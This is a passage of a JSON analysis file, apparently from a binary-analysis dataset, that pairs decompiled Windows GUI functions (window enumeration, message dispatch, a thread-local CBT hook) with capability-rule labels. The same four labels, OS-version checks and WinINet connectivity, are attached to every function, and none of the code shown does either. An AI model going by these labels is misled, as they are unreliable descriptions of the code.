        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0041f548(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_8ch;\n    uint hWnd;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x80);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00421f8e();\n    fcn.0041cf54();\n    uVar1 = *(extraout_ECX + 0x20);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(uVar1);\n    do {\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 0xffffffff;\n            *(unaff_EBP + -0x6c) = 0;\n            fcn.0041f0ac();\n            fcn.00458f1d();\n            return;\n        }\n        *(unaff_EBP + -0x6c) = iVar2;\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar2);\n        *(unaff_EBP + -0x34) = uVar3 & 0xffff;\n        *(unaff_EBP + -0x24) = unaff_EBP + -0x8c;\n        iVar4 = fcn.0041e6a5(iVar2);\n        if (iVar4 == 0) {\ncode_r0x0041f5bb:\n            iVar4 = fcn.00421dec(*(unaff_EBP + -0x34), 0xffffffff, unaff_EBP + -0x38, 0);\n            if (iVar4 == 0) {\n                iVar4 = *(unaff_EBP + 0xc);\n                if (iVar4 != 0) {\n                    uVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(unaff_EBP + -0x6c), 0x87, 0, 0);\n                    if ((uVar3 & 0x2000) != 0) {\n                        uVar3 = fcn.004225b8();\n                        uVar3 = uVar3 & 0xf;\n                        if ((((uVar3 != 3) && (uVar3 != 6)) && (uVar3 != 7)) && (uVar3 != 9)) goto code_r0x0041f612;\n                    }\n                    iVar4 = 0;\n                }\ncode_r0x0041f612:\n                fcn.00421fb4(*(unaff_EBP + 8), iVar4);\n            }\n        }\n        else {\n            iVar4 = fcn.00421dec(0, 0xbd11ffff, unaff_EBP + -0x38, 0);\n            if (iVar4 == 0) goto code_r0x0041f5bb;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    } while( true );\n}\n",
        "token_count": 813
    },
    "0041f64b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041f64b(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0041e6bf(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.0041f05b);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "0041fcfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fcfd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x50) == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x20));\n        uVar2 = fcn.00417552(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x20), uVar2);\n        fcn.00410110(0xffffffff);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041fd3c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x8c))();\n    return;\n}\n",
        "token_count": 199
    },
    "0041ffce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ffce(uint32_t wParam, int32_t lParam)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint hWnd;\n    \n    iVar4 = fcn.0041ffa6();\n    uVar7 = wParam & 0xfff0;\n    if ((uVar7 == 0xf040) || (uVar7 == 0xf050)) {\n        if (lParam != 0x75) {\n            return 0;\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        fcn.0042275a();\n    }\n    else {\n        if ((uVar7 != 0xf060) && (uVar7 != 0xf100)) {\n            return 0;\n        }\n        if (((uVar7 == 0xf060) || (lParam != 0)) && (iVar4 != 0)) {\n            uVar1 = *(in_ECX + 0x20);\n            uVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n            pcVar2 = _sym.imp.USER32.dll_SetActiveWindow;\n            uVar6 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(iVar4 + 0x20));\n            fcn.0041e67e(uVar6);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x20), 0x112, wParam, lParam);\n            pcVar3 = _sym.imp.USER32.dll_IsWindow;\n            iVar4 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar4 != 0) {\n                (*pcVar2)(uVar1);\n            }\n            iVar4 = (*pcVar3)(uVar5);\n            if (iVar4 != 0) {\n                (*_sym.imp.USER32.dll_SetFocus)(uVar5);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 457
    },
    "004202ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004202ad(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "004202de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004202de(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if ((((*param_1 == 0) && (param_1[1] == 0)) && (param_1[2] == 0xc0)) && (param_1[3] == 0x46000000)) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 108
    },
    "00420309": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420309(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar2 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar2 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        iVar2 = fcn.004202de(arg_10h);\n        if (iVar2 == 0) {\n            for (; pcVar1 = arg_ch[2],  pcVar1 != NULL; arg_ch = arg_ch + 3) {\n                iVar2 = *arg_ch;\n                if ((iVar2 == 0) || (iVar3 = fcn.00420273(iVar2, arg_10h),  iVar3 != 0)) {\n                    if (pcVar1 == 0x1) goto code_r0x0042033d;\n                    iVar3 = (*pcVar1)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((iVar2 != 0) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n            }\n            iVar2 = -0x7fffbffe;\n        }\n        else {\ncode_r0x0042033d:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 426
    },
    "0043220c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043220c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042b7b9();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.0042b7b9();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.004321a8(1);\n        iVar2 = fcn.0042b7b9();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x20) == 0)) {\n            iVar2 = fcn.0042b7b9();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.004247b8(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0042271e();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x004321f5. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x20) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00420922": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00420922(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00431568(0x419034);\n    if (iVar1 == 0) {\n        fcn.0041901a();\n    }\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, 0x4206cf, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00418fe6();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00420ad0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.00420ad0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code **ppcVar6;\n    uint32_t uVar7;\n    int32_t *arg_8h_00;\n    int32_t iVar8;\n    code *pcVar9;\n    int32_t unaff_EBP;\n    int16_t iVar10;\n    int16_t iVar11;\n    uint var_7ch;\n    uint var_5ch;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_24h;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x70);\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = 0x7fffffff;\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (uVar7 == 0x111) {\n        iVar3 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar3 != 0) {\ncode_r0x00420b0e:\n            *(unaff_EBP + -0x10) = 1;\n            goto code_r0x00420fc7;\n        }\n        goto code_r0x00420ce0;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) != 0) {\n            iVar3 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\n            goto joined_r0x00420fa4;\n        }\n        goto code_r0x00420ce0;\n    }\n    var_24h = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        uVar4 = fcn.0041e67e(var_24h);\n        fcn.0042049f(arg_8h_00, *(unaff_EBP + 0xc), uVar4);\n    }\n    iVar10 = var_24h;\n    if ((uVar7 == 0x20) && (iVar3 = fcn.00420515(arg_8h_00, iVar10, var_24h >> 0x10),  iVar3 != 0))\n    goto code_r0x00420b0e;\n    if ((((arg_8h_00[0x13] != 0) && (0 < *(arg_8h_00[0x13] + 0x74))) &&\n        ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) || (uVar7 - 0x281 < 0x11)))) &&\n       (iVar3 = (**(*arg_8h_00[0x13] + 0x94))(uVar7, *(unaff_EBP + 0xc), var_24h, unaff_EBP + -0x10),  iVar3 != 0))\n    goto code_r0x00420fc7;\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + 0x10) = uVar5;\n    fcn.0041cee3(7);\n    iVar8 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar3 = *(iVar8 + 0x4ab7c8);\n    *(unaff_EBP + -0x18) = iVar8 + 0x4ab7c8;\n    if ((*(unaff_EBP + 8) != iVar3) || (*(unaff_EBP + 0x10) != *(iVar8 + 0x4ab7d0))) {\n        puVar1 = *(unaff_EBP + -0x18);\n        ppcVar6 = *(unaff_EBP + 0x10);\n        *puVar1 = *(unaff_EBP + 8);\n        puVar1[2] = ppcVar6;\n        while (*ppcVar6 != NULL) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar3 = fcn.0041c2bc(ppcVar6[1], *(unaff_EBP + 8), 0, 0);\n                *(unaff_EBP + 0x10) = iVar3;\n                if (iVar3 != 0) {\n                    *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                    fcn.0041cf12();\n                    goto code_r0x00420c6e;\n                }\n            }\n            else {\n                iVar3 = *(*(unaff_EBP + 0x10) + 4);\n                uVar4 = 0xc000;\n                while (iVar3 = fcn.0041c2bc(iVar3, uVar4, 0, 0),  iVar3 != 0) {\n                    if (**(iVar3 + 0x10) == *(unaff_EBP + 8)) {\n                        *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                        fcn.0041cf12();\n                        goto code_r0x00420fb9;\n                    }\n                    iVar3 = iVar3 + 0x18;\n                }\n                ppcVar6 = *(unaff_EBP + 0x10);\n            }\n            ppcVar6 = (**ppcVar6)();\n            *(unaff_EBP + 0x10) = ppcVar6;\n        }\n        *(*(unaff_EBP + -0x18) + 4) = 0;\n        fcn.0041cf12();\n        goto code_r0x00420ce0;\n    }\n    iVar3 = *(iVar8 + 0x4ab7cc);\n    *(unaff_EBP + 0x10) = iVar3;\n    fcn.0041cf12();\n    if (iVar3 == 0) goto code_r0x00420ce0;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x00420fb9:\n        pcVar9 = *(iVar3 + 0x14);\ncode_r0x00420fbc:\n        var_28h = *(unaff_EBP + 0xc);\n        goto code_r0x00420fc0;\n    }\ncode_r0x00420c6e:\n    pcVar9 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar3 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar11 = var_24h >> 0x10;\n    var_14h = var_24h;\n    // switch table (69 cases) at 0x420fe8\n    switch(iVar3) {\n    case 1:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.0041a27a(var_14h);\n        goto code_r0x00420d0f;\n    case 2:\n    case 3:\n    case 4:\n    case 0x1b:\n    case 0x1c:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x00420d0f;\n    case 5:\n    case 0xc:\n        var_18h = var_24h & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0041e67e(uVar7, var_18h, var_24h >> 0x10);\n        goto code_r0x00420d44;\n    case 6:\n        var_24h = *(unaff_EBP + 0xc);\n        var_28h = fcn.0041e67e();\n        goto code_r0x00420fc0;\n    case 7:\n    case 0xd:\ncode_r0x00420d0f:\n        uVar4 = (*pcVar9)(var_14h);\ncode_r0x00420fc4:\n        *(unaff_EBP + -0x10) = uVar4;\n        break;\n    case 8:\n        fcn.00419a58();\n        uVar4 = var_24h[1];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x24) = uVar4;\n        fcn.0041cf54();\n        uVar4 = *var_24h;\n        uVar2 = var_24h[2];\n        *(unaff_EBP + -4) = 2;\n        *(unaff_EBP + -0x5c) = uVar4;\n        iVar3 = fcn.0041e6a5(uVar4);\n        if (iVar3 == 0) {\n            if ((arg_8h_00[0x13] != 0) && (iVar3 = fcn.0043179d(*(unaff_EBP + -0x5c)),  iVar3 != 0)) {\n                *(unaff_EBP + -0x2c) = iVar3;\n            }\n            iVar3 = unaff_EBP + -0x7c;\n        }\n        uVar4 = (*pcVar9)(unaff_EBP + -0x28, iVar3, uVar2);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x5c) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\n        *(unaff_EBP + -4) = 1;\n        fcn.0041f0ac();\n        goto code_r0x00420def;\n    case 9:\n        fcn.00419a58();\n        uVar4 = var_24h[2];\n        *(unaff_EBP + -0x24) = var_24h[1];\n        *(unaff_EBP + -4) = 3;\n        uVar4 = (*pcVar9)(unaff_EBP + -0x28, uVar4);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\ncode_r0x00420def:\n        *(unaff_EBP + -4) = 0;\n        fcn.0041a302();\n        break;\n    case 10:\n        uVar7 = fcn.0041e67e(var_24h, *(unaff_EBP + 0xc) >> 0x10);\n        var_18h = var_24h;\n        goto code_r0x00420e0d;\n    case 0xb:\n        var_24h = *(unaff_EBP + 0xc) >> 0x10;\n        var_28h = *(unaff_EBP + 0xc);\n        goto code_r0x00420fc0;\n    case 0xe:\n    case 0x2f:\n        goto code_r0x00420fbc;\n    case 0xf:\n        var_18h = fcn.0042b9a2(var_24h);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x00420e0d:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x00420d44:\n        uVar4 = (*pcVar9)(uVar5, uVar7, var_18h);\n        goto code_r0x00420fc4;\n    case 0x10:\n    case 0x12:\n    case 0x15:\n    case 0x1e:\n    case 0x2d:\n    case 0x32:\n        goto code_r0x00420f35;\n    case 0x11:\n    case 0x14:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x00420f42;\n    case 0x13:\n        (*pcVar9)();\n        break;\n    case 0x16:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x00420f38;\n    case 0x17:\n        var_14h = iVar11;\n        var_18h = iVar10;\n        goto code_r0x00420f38;\n    case 0x18:\n    case 0x19:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x00420f61;\n    case 0x1a:\n        fcn.0041e67e(var_24h);\ncode_r0x00420f35:\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x00420f38;\n    case 0x1d:\n    case 0x28:\n    case 0x31:\n        uVar4 = (*pcVar9)();\n        goto code_r0x00420fc4;\n    case 0x1f:\n        var_14h = *(unaff_EBP + 0xc);\n        var_18h = fcn.0041e67e(var_14h);\n        fcn.0041e67e(var_24h, var_18h);\n        uVar7 = arg_8h_00[8] == var_24h;\n        goto code_r0x00420f65;\n    case 0x20:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.0041a27a(var_14h);\n        goto code_r0x00420f42;\n    case 0x21:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.0042b9a2(var_14h);\n        goto code_r0x00420f42;\n    case 0x22:\n        var_14h = iVar11;\n        var_18h = iVar10;\n        uVar7 = fcn.0042b9a2(*(unaff_EBP + 0xc), var_18h, var_14h);\n        goto code_r0x00420f65;\n    case 0x23:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x00420ec7;\n    case 0x24:\ncode_r0x00420ec7:\n        fcn.0041e67e(var_14h);\n        goto code_r0x00420f42;\n    case 0x25:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x00420ee4;\n    case 0x26:\n        var_18h = iVar10;\n        var_14h = iVar11;\ncode_r0x00420ee4:\n        uVar7 = fcn.0041e67e(*(unaff_EBP + 0xc), var_18h, var_14h);\n        goto code_r0x00420f65;\n    case 0x27:\n        var_18h = fcn.0041e67e(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x00420f38;\n    case 0x29:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = fcn.0041e67e(var_24h, var_14h);\n        goto code_r0x00420f4f;\n    case 0x2a:\n    case 0x2b:\n        var_18h = *(unaff_EBP + 0xc);\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        *(unaff_EBP + 8) = var_18h;\n        *(unaff_EBP + 0xc) = var_14h;\n        if (iVar3 == 0x2a) {\n            var_18h = fcn.0041e67e(var_24h);\n            uVar7 = *(unaff_EBP + 0xc);\n            var_14h = var_24h;\n            goto code_r0x00420f65;\n        }\ncode_r0x00420f38:\n        (*pcVar9)(var_18h, var_14h);\n        break;\n    case 0x2c:\n    case 0x33:\ncode_r0x00420f42:\n        (*pcVar9)(var_14h);\n        break;\n    case 0x2e:\n    case 0x36:\n        (*pcVar9)(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x00420b0e;\n    case 0x30:\n    case 0x45:\n        var_28h = iVar10;\n        var_24h = iVar11;\ncode_r0x00420fc0:\n        uVar4 = (*pcVar9)(var_28h, var_24h);\n        goto code_r0x00420fc4;\n    case 0x34:\n        var_18h = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x00420f4f:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x00420f65;\n    case 0x35:\n        var_18h = iVar10;\n        var_14h = iVar11;\ncode_r0x00420f61:\n        uVar7 = *(unaff_EBP + 0xc);\ncode_r0x00420f65:\n        (*pcVar9)(uVar7, var_18h, var_14h);\n        break;\n    case 0x37:\n        iVar3 = (*pcVar9)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, iVar10, iVar11);\n        *(unaff_EBP + -0x10) = iVar3;\n        goto joined_r0x00420fa4;\n    case 0x44:\n        iVar3 = (*pcVar9)();\n        *(unaff_EBP + -0x10) = iVar3;\njoined_r0x00420fa4:\n        if (iVar3 != 0) {\ncode_r0x00420ce0:\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041cf12();\n            goto code_r0x00420cee;\n        }\n    }\ncode_r0x00420fc7:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041cf12();\ncode_r0x00420cee:\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 4517
    },
    "0042165d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042165d(uint arg_8h)\n\n{\n    int32_t lpWndClass;\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_38h;\n    uint var_4h;\n    \n    fcn.00458e78(0x30);\n    lpWndClass = *(unaff_EBP + 8);\n    iVar2 = fcn.0041ca87(*(lpWndClass + 0x10), *(lpWndClass + 0x24), unaff_EBP + -0x38);\n    if (((iVar2 == 0) && (iVar1 = fcn.0041c9f4(lpWndClass),  iVar1 != 0)) &&\n       (iVar2 = fcn.0042b7b9(),  *(iVar2 + 0x14) != '\\0')) {\n        fcn.004320fb(1);\n        *(unaff_EBP + -4) = 0;\n        fcn.0042b7b9();\n        fcn.004182f6(*(lpWndClass + 0x24));\n        fcn.00418248(10);\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00432168(1);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 317
    },
    "004217ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004217ee(uint16_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint16_t *puVar5;\n    uint *puVar6;\n    uint var_34h;\n    uint var_30h;\n    uint16_t *var_2ch;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    puVar5 = arg_8h;\n    var_8h = in_ECX;\n    if (arg_8h != NULL) {\n        do {\n            uVar3 = *puVar5;\n            if (*puVar5 == 0) break;\n            uVar2 = puVar5[1];\n            var_10h = *(puVar5 + 2);\n            puVar5 = puVar5 + 4;\n            var_ch = uVar3;\n            if (uVar2 == 0x1234) {\ncode_r0x00421859:\n                puVar6 = &var_30h;\n                for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_30h = 0xffffffff;\n                var_34h = 1;\n                fcn.00402f40(puVar5);\n                var_2ch = arg_8h;\n                iVar4 = (*pcVar1)(*(var_8h + 0x20), var_ch & 0xffff, 0x401, 0, &var_34h);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n                fcn.004010d0();\n                in_ECX = var_8h;\n            }\n            else if (uVar2 == 0x401) {\n                uVar2 = 0x180;\ncode_r0x004218ba:\n                iVar4 = (*pcVar1)(*(in_ECX + 0x20), uVar3, uVar2, 0, puVar5);\n                if (iVar4 == -1) {\n                    var_4h = 0;\n                }\n            }\n            else {\n                if (uVar2 == 0x403) {\n                    uVar2 = 0x143;\n                }\n                if (uVar2 == 0x401) goto code_r0x00421859;\n                if ((uVar2 == 0x180) || (uVar2 == 0x143)) goto code_r0x004218ba;\n            }\n            puVar5 = puVar5 + var_10h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0041f27a(*(in_ECX + 0x20), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 731
    },
    "00421dec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421dec(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    code **ppcVar4;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar5;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.0042b7b9();\n        if (*(iVar1 + 0x3c) != 0) goto code_r0x00421e0a;\n    }\n    else {\n        if (arg_ch != 0xfffffffd) {\n            if (arg_ch != 0xffffffff) {\n                arg_ch_00 = arg_ch >> 0x10;\n                arg_ch = arg_ch & 0xffff;\n                if (arg_ch_00 != 0) goto code_r0x00421ec0;\n            }\n            arg_ch_00 = 0x111;\ncode_r0x00421ec0:\n            ppcVar4 = (**(*in_ECX + 0x28))();\n            while( true ) {\n                if (*ppcVar4 == NULL) {\n                    return 0;\n                }\n                iVar1 